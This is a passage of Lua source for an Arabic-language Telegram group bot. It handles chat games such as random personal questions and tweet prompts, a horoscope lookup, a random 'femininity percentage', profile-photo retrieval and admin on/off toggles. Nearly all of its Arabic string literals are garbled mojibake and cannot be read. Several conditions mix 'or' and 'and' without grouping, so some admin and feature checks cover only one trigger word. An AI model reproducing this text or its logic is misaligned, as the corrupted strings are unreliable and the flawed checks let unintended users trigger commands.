"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΨ§ ΩΩ Ψ§Ψ³ΩΨ£ Ψ?Ψ¨Ψ± Ψ³ΩΨΉΨͺΩ Ψ¨Ψ­ΩΨ§ΨͺΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω | ΩΩ Ψ¬Ψ±Ψ­Ψͺ Ψ΄Ψ?Ψ΅ ΨͺΨ­Ψ¨Ω ΩΩ ΩΨ¨Ω Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΨ§ ΩΩ Ψ§ΩΨΉΨ§Ψ―Ψ© Ψ§ΩΨͺΩ ΨͺΩΨ­Ψ¨ Ψ£Ω ΨͺΨ¨ΨͺΨΉΨ― ΨΉΩΩΨ§Ψ",
"βΨ΅Ψ±Ψ§Ψ­Ω | ΩΩ ΨͺΨ­Ψ¨ ΨΉΨ§Ψ¦ΩΨͺΩ Ψ§Ω ΨͺΩΨ±ΩΩΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω | ΩΩ ΩΩ Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ°Ω ΩΨ£ΨͺΩ ΩΩ ΩΩΨ¨Ω Ψ¨ΨΉΨ― Ψ§ΩΩΩ β Ψ³Ψ¨Ψ­Ψ§ΩΩ ΩΨͺΨΉΨ§ΩΩ- ΩΨ±Ψ³ΩΩΩ Ψ§ΩΩΨ±ΩΩ β Ψ΅ΩΩ Ψ§ΩΩΩ ΨΉΩΩΩ ΩΨ³ΩΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω | ΩΩ Ψ?Ψ¬ΩΨͺ ΩΩ ΩΩΨ³Ω ΩΩ ΩΨ¨ΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω | ΩΨ§ ΩΩ Ψ§ Ψ§ΩΨ­ΩΩ Ψ§ΩΨ°Ω ΩΩ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ§Ω ΨͺΨ­ΩΩΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω | ΩΨ§ ΩΩ Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ°Ω ΨͺΨ­ΩΩ Ψ¨Ω ΩΩ ΩΩΩΨ©Ψ",
"βΨ΅Ψ±Ψ§Ψ­Ω | ΩΩ ΨͺΨΉΨ±ΨΆΨͺ Ψ₯ΩΩ ΩΩΩΩ ΩΩΨ­Ψ±Ψ¬ Ψ¬ΨΉΩΩ ΨͺΩΨ±Ω Ψ΅Ψ§Ψ­Ψ¨ΩΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω | ΩΩ ΩΩΨͺ Ψ¨Ψ§ΩΨ¨ΩΨ§Ψ‘ Ψ£ΩΨ§Ω ΩΩ ΨͺΩΨ­Ψ¨Ψ",
"βΨ΅Ψ±Ψ§Ψ­Ω | ΩΨ§Ψ°Ψ§ ΨͺΨ?ΨͺΨ§Ψ± Ψ­Ψ¨ΩΨ¨Ω Ψ£Ω Ψ΅Ψ―ΩΩΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω | ΩΩ Ψ­ΩΨ§ΨͺΩ Ψ³ΨΉΩΨ―Ψ© Ψ£Ω Ψ­Ψ²ΩΩΨ©Ψ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΨ§ ΩΩ Ψ£Ψ¬ΩΩ Ψ³ΩΨ© ΨΉΨ΄ΨͺΩΨ§ Ψ¨Ψ­ΩΨ§ΨͺΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω | ΩΨ§ ΩΩ ΨΉΩΨ±Ω Ψ§ΩΨ­ΩΩΩΩΨ",
"βΨ΅Ψ±Ψ§Ψ­Ω | ΩΨ§ Ψ§ΩΨ«Ψ± Ψ΄Ω ΩΨ―ΩΩ ΨΉΩΩΩΨ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΨ§ ΩΩ Ψ£ΩΩΩΨ§ΨͺΩ Ψ§ΩΩΩΨ³ΨͺΩΨ¨ΩΩΨ©Ψβ",
"Ψ΅Ψ±Ψ§Ψ­Ω | ΩΩ ΩΨ¨ΩΨͺ ΩΨͺΨ§ΩΨ"
}
send(msg.chat_id_, msg.id_,'['..LEADER_Msg[math.random(#LEADER_Msg)]..']') 
return false
end
if text and text ~="Ψ΅Ψ±Ψ§Ψ­Ω" and database:get(bot_id..":"..msg.sender_user_id_..":rkko_Bots"..msg.chat_id_) == "sendrkkoe" then
numj = {"Ψ§Ω Ψ§ΩΩΨ―Ψ¨ Ψ―Ψ§ π","ΩΨΉΩΨ§ Ψ¨ΨͺΨͺΩΩΩ Ψ΅Ψ­π€","ΩΨ¬Ψ―ΨΉ ΩΩΩ ΩΩΨ§Ω ΨΊΩΨ± Ψ―Ψ§πΉ","Ψ­Ψ΅Ω Ψ§ΩΩΨ§Ψ§ΩπΉπ","Ψ·Ψ¨ ΨΉΩΩΩ Ω ΨΉΩΩΩ ΩΨ―Ψ§ π","Ψ§ΩΨͺ Ψ΅Ψ­πβ₯",};
sendnuj = numj[math.random(#numj)]
xl = ' β» '..text..' Ω­ \n '..sendnuj..'.'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":rkko_Bots"..msg.chat_id_)
end


-------
if text and text ~="Ψ§Ψ¨Ψ±Ψ§Ψ¬" and database:get(bot_id..":"..msg.sender_user_id_.."brgg"..msg.chat_id_) == "sendbrgg" then
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
send(msg.chat_id_, msg.id_, 'Ω­ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ± ')
database:del(bot_id..":"..msg.sender_user_id_.."brgg"..msg.chat_id_)
return false  
end 
gk = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(text)..'')
br = JSON.decode(gk)
i = 0
for k,v in pairs(br.ok) do
i = i + 1
t = v.."\n"
end
send(msg.chat_id_, msg.id_, t)
database:del(bot_id..":"..msg.sender_user_id_.."brgg"..msg.chat_id_)
end
if text == 'Ψ§Ψ¨Ψ±Ψ§Ψ¬' or text == 'Ψ§ΩΨ§Ψ¨Ψ±Ψ§Ψ¬' and database:get(bot_id.." amir:brj_Bots"..msg.chat_id_) == "open" then  
database:set(bot_id..":"..msg.sender_user_id_.."brgg"..msg.chat_id_,"sendbrgg")
send(msg.chat_id_, msg.id_, 'Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΨ§Ω Ψ¨Ψ±Ψ¬Ω')
end
if text == "ΩΨ³Ψ¨Ω Ψ§ΩΨ§ΩΩΨ«Ω" or text == "ΩΨ³Ψ¨Ω Ψ§ΩΩΨ«Ω" and msg.reply_to_message_id_ ~= 0 and Admin(msg) then
database:set(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_,"sendanoe")
Text = 'Ψ§Ψ±Ψ³Ω Ψ§Ψ³Ω Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ°Ω ΨͺΨ±ΩΨ― ΩΩΨ§Ψ³ ΩΨ³Ψ¨Ω Ψ§ΩΩΨ«ΨͺΩΨ§ \n ΩΨ«Ψ§Ω ΩΩΩΩ'
send(msg.chat_id_, msg.id_,Text) 
end
if text and text ~="ΩΨ³Ψ¨Ω Ψ§ΩΨ§ΩΩΨ«Ω" and database:get(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_) == "sendanoe" then
numj = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",};
sendnuj = numj[math.random(#numj)]
xl = 'ΩΨ³Ψ¨Ω Ψ§ΩΨ§ΩΩΨ«Ω '..text..' ΩΩ : \n '..sendnuj..'%'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_)
end
------------
if text == "ΨͺΩΩΨͺ" or text == "ΩΨͺ ΨͺΩΩΨͺ" then
local TWEET_Msg = {
" Ψ§ΩΨͺ Ψ­Ψ²ΩΩ Ψ§ΩΩ Ψ΄Ψ?Ψ΅ ΨͺΨͺΨ΅Ω ΨΉΩΩΩΨ",
"ΩΨͺΩ ΨͺΩΨ±Ψ± ΨͺΩΨ³Ψ­Ψ¨ ΩΩ Ψ£Ω ΨΉΩΨ§ΩΨ© Ψ ",
"ΨͺΩΩΩ ΩΨ³ΩΨ§Ψ³ ΩΩ Ψ΄ΩΨ‘ ΩΨΉΩΩ Ψ ",
"ΩΩ Ψ£ΩΨͺ ΩΩ Ψ§ΩΩΩΨΉ Ψ§ΩΨ°Ω ΩΩΨ§Ψ¬Ω Ψ§ΩΩΨ΄Ψ§ΩΩ Ψ£Ω ΩΩ Ψ§ΩΩΩΨΉ Ψ§ΩΨ°Ω ΩΩΨ±Ψ¨ Ψ ",
" ΩΩ ΩΨ³Ψ¨Ψ© Ψ§ΩΨ¨ΩΨͺΩΨͺΩΨ© ΩΩ Ψ΄Ψ?Ψ΅ΩΨͺΩΨ",
"Ψ±Ψ―Ψ© ΩΨΉΩΩ ΩΩΩ ΩΨͺΨ¬Ψ§ΩΩΩ Ψ¨Ψ§ΩΨ±Ψ― ΩΨͺΨΉΩΨ―Ψ ",
" ΩΩΨ§Ω ΩΨ―Ω ΩΩΨ΅Ω ΩΩΨ΄Ψ?Ψ΅ Ψ§ΩΩΨ·ΩΩΨ¨ Ψ",
"Ψ£ΩΩ Ψ΄ΩΨ‘ ΩΨ?Ψ·Ψ± ΩΩ Ψ¨Ψ§ΩΩ Ψ₯Ψ°Ψ§ Ψ³ΩΨΉΨͺ ΩΩΩΨ© ΩΨ¬ΩΩ Ψ ",
"ΩΨ³ΩΨ³Ω ΩΨ±ΨͺΩΩΩ ΩΩ Ψ°ΩΨ±ΩΨ§Ψͺ Ψ¬ΩΩΩΨ© ΨΉΩΨ―ΩΨ ",
" ΨΉΩΨ±Ω ΨΆΨ­ΩΨͺ Ψ¨Ψ§Ψ΄ΩΨ§Ψ‘ ΩΨ§Ψ¬Ω Ψ΄Ψ?Ψ΅ Ω ΩΨ³ΩΩ Ψ",
" ΨͺΨ¬Ψ§ΩΩ Ψ§ΩΩΨ§Ψ³ ΩΩΨ§ Ψ§ΩΩΩ Ψ¨ΩΩΨ¨Ω ΨΉΩΩ ΩΨ³Ψ§ΩΩΨ",
"Ψ¬Ψ±Ψ¨Ψͺ Ψ΄ΨΉΩΨ± Ψ§Ψ­Ψ― ΩΨ­Ψ¨Ω Ψ¨Ψ³ Ψ§ΩΨͺ ΩΩ ΩΨ§Ψ―Ψ± ΨͺΨ­Ψ¨ΩΨ ",
"Ψ§Ψ?Ψ± ΩΨͺΨ§Ψ¨ ΩΨ±Ψ’ΨͺΩ",
"Ψ§ΩΨΆΩ ΩΩΩ Ω Ψ­ΩΨ§ΨͺΩ",
"Ψ­ΩΩΨͺΩ Ω Ψ§ΩΨ­ΩΨ§Ω",
"ΩΩΩ ΨΉΩΩΩΩ",
"ΩΨ΄ Ψ§Ψ³Ω Ψ§ΩΩ Ψ΄Ψ?Ψ΅ ΨͺΨΉΨ±ΩΨͺ ΨΉΩΩΩ ΩΨ§ΩΨͺΩΩΨ±Ψ§Ω Ψ",
"ΨΉΨ§Ψ―Ω ΨͺΨͺΨ²ΩΨ¬ ΩΩ Ψ¨Ψ±Ψ§ Ψ§ΩΩΨ¨ΩΩΨ©Ψ",
" ΨͺΩΨΆΩΩ Ψ§ΩΩΩΨ§Ψ΄ Ψ§ΩΨ·ΩΩΩ Ψ§Ω ΨͺΨ­Ψ¨ Ψ§ΩΨ§Ψ?ΨͺΨ΅Ψ§Ψ± Ψ",
"ΩΨ― ΨͺΨ?ΩΩΨͺ Ψ΄Ω ΩΩ Ψ¨Ψ§ΩΩ ΩΨ΅Ψ§Ψ± Ψ",
"ΩΩ ΩΩ Ψ­Ψ³Ψ§Ψ¨Ω Ψ§ΩΨ¨ΩΩΩ Ψ",
"Ψ³Ψ€Ψ§Ω ΩΩΨ±ΩΨ²Ω Ψ",
"Ψ£Ψ¬ΩΩ Ψ΄ΩΨ‘ Ψ­Ψ΅Ω ΩΨΉΩ Ψ?ΩΨ§Ω ΩΨ°Ψ§ Ψ§ΩΨ§Ψ³Ψ¨ΩΨΉ Ψ",
"Ψ£Ψ¬ΩΩ Ψ΄ΩΨ‘ Ψ­Ψ΅Ω ΩΨΉΩ Ψ?ΩΨ§Ω ΩΨ°Ψ§ Ψ§ΩΨ§Ψ³Ψ¨ΩΨΉ Ψ ",
"Ψ§ΩΩΩΩΨ³ Ψ§Ω Ψ§ΩΨ­Ψ¨ Ψ ",
" Ψ§ΩΨ§Ψ±ΨͺΨ¨Ψ§Ψ· Ψ³ΩΨ΄ΩΨ§Ω ΩΩΨ§ΩΨͺΩ Ψ§ΩΨ ",
" ΩΨ§ Ψ§ΩΨ³ΩΨ‘ ΩΩ ΩΨ°Ω Ψ§ΩΨ­ΩΨ§Ψ© Ψ ",
" ΩΨ³Ψ¨Ψ© Ψ±ΨΆΨ§Ω ΨΉΩ Ψ§ΩΨ£Ψ΄Ψ?Ψ§Ψ΅ ΩΩ Ψ­ΩΩΩ ΩΨ§ΩΩΨͺΨ±Ψ©",
" Ψ§Ω Ψ§Ψ?Ψ±ΨͺΩΨ§ ΩΨΉΩΩ ΩΨͺΩΨΆΩ ΩΨΉΨ§ΩΨ§Ψ ",
"ΩΨͺΨ§Ψ¨Ω Ψ§ΩΩΩΨΆΩ",
"ΩΩΨ§ΩΨͺΩ Ψ§ΩΩΩΨΆΩΩ",
"ΩΨͺ ΨͺΩΩΨͺ β| ΨͺΨ?ΩΩΩ ΩΩ Ψ£ΩΩ Ψ³ΨͺΨ±Ψ³Ω Ψ΄ΩΨ‘ ΩΨ­ΩΨ― ΩΩΨ΅Ψ¨Ψ­ Ψ­ΩΩΩΨ©Ψ ΩΨ§Ψ°Ψ§ Ψ³ΨͺΨ±Ψ³ΩΨ",
"ΩΨͺ ΨͺΩΩΨͺ | Ψ£ΩΨ«Ψ± Ψ΄ΩΨ‘ ΩΩΨ³ΩΩΨͺ Ψ§ΩΨ·ΩΩ Ψ¨Ψ±Ψ£ΩΩΨ",
"ΩΨͺ ΨͺΩΩΨͺ | Ψ§ΩΨ­Ψ±ΩΨ© ΩΩ ... Ψ",
"ΩΨͺ ΨͺΩΩΨͺ | ΩΩΨ§Ψ© Ψ§ΩΩΨ±ΨͺΩΩ Ψ§ΩΩΩΨΆΩΨ© ΩΩ Ψ·ΩΩΩΨͺΩΨ",
"ΩΨͺ ΨͺΩΩΨͺ β| ΩΩΩΨ© ΩΩΨ΅ΩΨ―Ψ§ΨΉΨ",
"ΩΨͺ ΨͺΩΩΨͺ β| ΩΨ§ Ψ§ΩΨ΄ΩΨ‘ Ψ§ΩΨ°Ω ΩΩΩΨ§Ψ±ΩΩΨ",
"ΩΨͺ ΨͺΩΩΨͺ | ΩΩΩΩ ΩΩΩΨ² ΩΨΉΩΨͺΩ ΩΨΉ Ψ΄Ψ?Ψ΅ ΩΩΨ§ ΩΨ²Ψ§Ω ΩΨ°ΩΨ±Ω ΩΩΨ",
"ΩΨͺ ΨͺΩΩΨͺ β| Ψ£ΩΩΩΨ§ ΩΩΨͺΨ΅Ψ±Ψ Ψ§ΩΩΨ¨Ψ±ΩΨ§Ψ‘ Ψ£Ω Ψ§ΩΨ­Ψ¨Ψ",
"ΩΨͺ ΨͺΩΩΨͺ | Ψ¨ΨΉΨ― Ω‘Ω  Ψ³ΩΩΩ Ψ§ΩΨ΄ Ψ¨ΨͺΩΩΩ Ψ",
"ΩΨͺ ΨͺΩΩΨͺ β| ΩΩΩ Ψ£ΨΊΨ±Ψ¨ ΩΨ£Ψ¬ΩΩ Ψ§ΩΨ£Ψ³ΩΨ§Ψ‘ Ψ§ΩΨͺΩ ΩΨ±Ψͺ ΨΉΩΩΩΨ",
"βΩΨͺ ΨͺΩΩΨͺ | ΨΉΩΨ±Ω Ψ΄ΩΨͺ ΩΨ΅ΩΨ¨Ψ© ΨΉΩ Ψ΄Ψ?Ψ΅ Ψ¨Ψ±ΨΊΨ¨ΨͺΩ Ψ",
"ΩΨͺ ΨͺΩΩΨͺ | Ψ£ΩΨ«Ψ± Ψ³Ψ€Ψ§Ω ΩΨ¬ΩΩΩ Ψ₯ΩΩΩ ΩΨ€Ψ?Ψ±ΩΨ§Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ‘ Ψ§ΩΨ°Ω ΩΨ¬ΨΉΩΩ ΨͺΨ΄ΨΉΨ± Ψ¨Ψ§ΩΨ?ΩΩΨ",
"βΩΨͺ ΨͺΩΩΨͺ | ΩΨ΄ ΩΩΨ³Ψ― Ψ§ΩΨ΅Ψ―Ψ§ΩΨ©Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | Ψ΄Ψ?Ψ΅ ΩΨ§ΨͺΨ±ΩΨΆ ΩΩ Ψ·ΩΨ¨Ψ§ Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | ΩΩ ΩΨ±Ω Ψ?Ψ³Ψ±Ψͺ Ψ΄Ψ?Ψ΅ ΨͺΨ­Ψ¨ΩΨ.",
"βΩΨͺ ΨͺΩΩΨͺ | ΩΩΩ ΨͺΨͺΨΉΨ§ΩΩ ΩΨΉ Ψ§ΩΨ§Ψ΄Ψ?Ψ§Ψ΅ Ψ§ΩΨ³ΩΨ¨ΩΩΩ Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | ΩΩΩΨ© ΨͺΨ΄ΨΉΨ± Ψ¨Ψ§ΩΨ?Ψ¬Ω Ψ§Ψ°Ψ§ ΩΩΩΨͺ ΩΩΨ",
"βΩΨͺ ΨͺΩΩΨͺ | Ψ¬Ψ³ΩΩ Ψ§ΩΨ¨Ψ± ΩΩ ΨΉΩΩΨ±Ω Ψ§Ω Ψ§ΩΨΉΩΨ³Ω Ψ!",
"βΩΨͺ ΨͺΩΩΨͺ |Ψ£ΩΩΩ ΩΨ°Ψ¨Ψ© ΩΨ΄Ψͺ ΨΉΩΩΩ Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | ΨͺΨͺΨ£Ψ«Ψ± Ψ¨Ψ―ΩΩΨΉ Ψ΄Ψ?Ψ΅ ΩΨ¨ΩΩ ΩΨ―Ψ§ΩΩ ΩΨ¨Ω ΨͺΨΉΨ±Ω Ψ§ΩΨ³Ψ¨Ψ¨ Ψ",
"ΩΨͺ ΨͺΩΩΨͺ | ΩΩ Ψ­Ψ―Ψ« ΩΨΆΨ­ΩΨͺ ΩΩ Ψ£Ψ¬Ω Ψ΄Ψ?Ψ΅Ω Ψ£Ψ­Ψ¨Ψ¨ΨͺΨ",
"βΩΨͺ ΨͺΩΩΨͺ | Ψ£ΩΨ«Ψ± ΨͺΨ·Ψ¨ΩΩ ΨͺΨ³ΨͺΨ?Ψ―ΩΩ ΩΨ€Ψ?Ψ±ΩΨ§Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | βΨ§ΩΨ«Ψ± Ψ΄Ω ΩΨ±ΨΆΩΩ Ψ§Ψ°Ψ§ Ψ²ΨΉΩΨͺ Ψ¨Ψ―ΩΩ ΨͺΩΩΩΨ± Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | ΩΨ΄ ΩΨ­ΨͺΨ§Ψ¬ ΨΉΨ΄Ψ§Ω ΨͺΩΩΩ ΩΨ¨Ψ³ΩΨ· Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | ΩΨ·ΩΨ¨Ω Ψ§ΩΩΨ­ΩΨ― Ψ§ΩΨ­ΩΩ Ψ",
"βΩΨͺ ΨͺΩΩΨͺ | ΩΩ Ψ­Ψ―Ψ« ΩΨ΄ΨΉΨ±Ψͺ Ψ¨Ψ£ΩΩ Ψ§Ψ±ΨͺΩΨ¨Ψͺ Ψ£Ψ­Ψ― Ψ§ΩΨ°ΩΩΨ¨ Ψ£Ψ«ΩΨ§Ψ‘ Ψ§ΩΨ΅ΩΨ§ΩΨ",
"ΨΉΩΨ§ΩΨͺΩ ΩΨΉ Ψ§ΩΩΩ",
"Ψ«ΩΨ§Ψ«Ψ© Ψ£Ψ΄ΩΨ§Ψ‘ ΨͺΨ­Ψ¨ΩΨ§"
}
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']') 
return false
end
-------
if text == "ΨͺΩΨΉΩΩ Ψ΅ΩΨ±ΨͺΩ" or text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ΅ΩΨ±Ω' then
if Admin(msg) then 
database:del(bot_id.."my_photo:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ΅ΩΨ±Ω") 
return false 
end
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ΅ΩΨ±Ω" or text == 'ΨͺΨΉΨ·ΩΩ Ψ΅ΩΨ±ΨͺΩ' then
if Admin(msg) then 
database:set(bot_id.."my_photo:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ΅ΩΨ±Ω") 
return false end
end
if text == "Ψ΅ΩΨ±ΨͺΩ" then
local my_ph = database:get(bot_id.."my_photo:status"..msg.chat_id_)
if my_ph then
send(msg.chat_id_, msg.id_," Ω­ Ψ§ΩΨ΅ΩΨ±Ω ΩΨΉΨ·ΩΩ") 
return false 
end
local function mahmoud(extra, mahmoud, success)
if mahmoud.photos_[0] then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ΅ΩΨ±ΨͺΩ Ψ§ΩΨͺΨ§ΩΩΩ', callback_data=msg.sender_user_id_.."/sorty2"},
},
}
local msg_id = msg.id_/2097152/0.5
local Teext = " Ω­ ΨΉΨ―Ψ― Ψ΅ΩΨ±Ω ~βͺΌ "..mahmoud.total_count_.." Ψ΅ΩΨ±Ωββ"
local ph = mahmoud.photos_[0].sizes_[1].photo_.persistent_id_
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..ph..'&caption=' .. URL.escape(Teext).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,'ΩΨ§ ΨͺΩΨͺΩΩ Ψ΅ΩΨ±Ω ΩΩ Ψ­Ψ³Ψ§Ψ¨Ω', 1, 'md')
 end end 
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, mahmoud, nil)
end 
------by-dev-7oda---
if text and text:match("^Ψ΅ΩΨ±ΨͺΩ (%d+)$") then
local mahmoud = {string.match(text, "^(Ψ΅ΩΨ±ΨͺΩ) (%d+)$")}
local function gproen(extra, result, success)
local my_ph = database:get(bot_id.."my_photo:status"..msg.chat_id_)
if my_ph then
send(msg.chat_id_, msg.id_," Ω­ Ψ§ΩΨ΅ΩΨ±Ω ΩΨΉΨ·ΩΩ") 
else
if mahmoud[2] == '1' then
if result.photos_[0] then
sendPhoto(msg.chat_id_,msg.id_,result.photos_[0].sizes_[1].photo_.persistent_id_)
else
send(msg.chat_id_,msg.id_,"Ω­ ΩΨ§ ΨͺΩΨͺΩΩ Ψ΅ΩΨ±Ω ΩΩ Ψ­Ψ³Ψ§Ψ¨Ω  ", 1, 'md')
end
elseif mahmoud[2] == '2' then
if result.photos_[1] then
sendPhoto(msg.chat_id_,msg.id_,result.photos_[1].sizes_[1].photo_.persistent_id_)
else
send(msg.chat_id_,msg.id_,'οΈΩ­ Ψ§ΩΨͺ ΩΨ§ ΨͺΩΨͺΩΩ Ψ§ΩΨ΅ΩΨ±Ω Ψ§ΩΨͺΩ Ψ·ΩΨ¨Ψͺ Ψ±ΩΩΩΨ§ ')
end
elseif mahmoud[2] == '3' then
if result.photos_[2] then
sendPhoto(msg.chat_id_,msg.id_,result.photos_[2].sizes_[1].photo_.persistent_id_)
else
send(msg.chat_id_,msg.id_,'οΈΩ­ Ψ§ΩΨͺ ΩΨ§ ΨͺΩΨͺΩΩ Ψ§ΩΨ΅ΩΨ±Ω Ψ§ΩΨͺΩ Ψ·ΩΨ¨Ψͺ Ψ±ΩΩΩΨ§ ')
end
elseif mahmoud[2] == '4' then
if result.photos_[3] then
sendPhoto(msg.chat_id_,msg.id_,result.photos_[3].sizes_[1].photo_.persistent_id_)
else
send(msg.chat_id_, msg.id_,'οΈΩ­ Ψ§ΩΨͺ ΩΨ§ ΨͺΩΨͺΩΩ Ψ§ΩΨ΅ΩΨ±Ω Ψ§ΩΨͺΩ Ψ·ΩΨ¨Ψͺ Ψ±ΩΩΩΨ§ ')
end
elseif mahmoud[2] == '5' then
if result.photos_[4] then
sendPhoto(msg.chat_id_,msg.id_,result.photos_[4].sizes_[1].photo_.persistent_id_)
else
send(msg.chat_id_,msg.id_,'οΈΩ­ Ψ§ΩΨͺ ΩΨ§ ΨͺΩΨͺΩΩ Ψ§ΩΨ΅ΩΨ±Ω Ψ§ΩΨͺΩ Ψ·ΩΨ¨Ψͺ Ψ±ΩΩΩΨ§ ')
end
elseif mahmoud[2] == '6' then
if result.photos_[5] then
sendPhoto(msg.chat_id_,msg.id_,result.photos_[5].sizes_[1].photo_.persistent_id_)
else
send(msg.chat_id_,msg.id_,'οΈΩ­ Ψ§ΩΨͺ ΩΨ§ ΨͺΩΨͺΩΩ Ψ§ΩΨ΅ΩΨ±Ω Ψ§ΩΨͺΩ Ψ·ΩΨ¨Ψͺ Ψ±ΩΩΩΨ§ ')
end
elseif mahmoud[2] == '7' then
if result.photos_[6] then
sendPhoto(msg.chat_id_,msg.id_,result.photos_[6].sizes_[1].photo_.persistent_id_)
else
send(msg.chat_id_,msg.id_,'Ω­ Ψ§ΩΨͺ ΩΨ§ ΨͺΩΨͺΩΩ Ψ§ΩΨ΅ΩΨ±Ω Ψ§ΩΨͺΩ Ψ·ΩΨ¨Ψͺ Ψ±ΩΩΩΨ§ ')
end
elseif mahmoud[2] == '8' then
if result.photos_[7] then
sendPhoto(msg.chat_id_,msg.id_,result.photos_[7].sizes_[1].photo_.persistent_id_)
else
send(msg.chat_id_,msg.id_,'Ω­ Ψ§ΩΨͺ ΩΨ§ ΨͺΩΨͺΩΩ Ψ§ΩΨ΅ΩΨ±Ω Ψ§ΩΨͺΩ Ψ·ΩΨ¨Ψͺ Ψ±ΩΩΩΨ§ ')
end
elseif mahmoud[2] == '9' then
if result.photos_[8] then
sendPhoto(msg.chat_id_,msg.id_,result.photos_[8].sizes_[1].photo_.persistent_id_)
else
send(msg.chat_id_,msg.id_,'οΈΩ­ Ψ§ΩΨͺ ΩΨ§ ΨͺΩΨͺΩΩ Ψ§ΩΨ΅ΩΨ±Ω Ψ§ΩΨͺΩ Ψ·ΩΨ¨Ψͺ Ψ±ΩΩΩΨ§ ')
end
elseif mahmoud[2] == '10' then
if result.photos_[9] then
sendPhoto(msg.chat_id_,msg.id_,result.photos_[9].sizes_[1].photo_.persistent_id_)
else
send(msg.chat_id_,msg.id_,'οΈΩ­ Ψ§ΩΨͺ ΩΨ§ ΨͺΩΨͺΩΩ Ψ§ΩΨ΅ΩΨ±Ω Ψ§ΩΨͺΩ Ψ·ΩΨ¨Ψͺ Ψ±ΩΩΩΨ§ ')
end else
send(msg.chat_id_,msg.id_,"Ω­ ΩΨ§ ΩΩΩΩΩΩ Ψ§Ω Ψ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨ«Ψ± ΩΩ 10 Ψ΅ΩΨ± ")
end end end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = mahmoud[2]
}, gproen, nil) 
end
---dev-7oda---
if text == "Ψ¨ΩΨͺ" then
N = (database:get(bot_id.."Name:Bot") or "Ψ±ΩΩΩΨ±")
tdcli_function ({ID = "GetUser",user_id_ = bot_id,},function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = Id_Sudo,},function(arg,result) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = bot_id,offset_ = 0,limit_ = 1},function(extra,mahmoud,success) 
if mahmoud.photos_[0] then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΨΆΩ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ¬ΩΩΨΉΨͺΩ', url = "https://t.me/"..data.username_.."?startgroup=new"},
},
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
},
}
local msg_id = msg.id_/2097152/0.5
local Texti = "Ω­ Ψ§Ψ³ΩΩ "..N.." "
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Texti)..'&photo='..mahmoud.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end,nil)
end,nil)
end,nil)
end
---------
if text == "ΨͺΩΨΉΩΩ ΩΨ³Ψ¨Ω Ψ¬ΩΨ§ΩΩ" or text == 'ΨͺΩΨΉΩΩ ΩΨ³Ψ¨Ω Ψ§ΩΨ¬ΩΨ§Ω' then
if Admin(msg) then 
database:del(bot_id.."my_gmal:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," Ω­ ΨͺΩ ΨͺΩΨΉΩΩ ΩΨ³Ψ¨Ω Ψ¬ΩΨ§ΩΩ") 
return false 
end
end
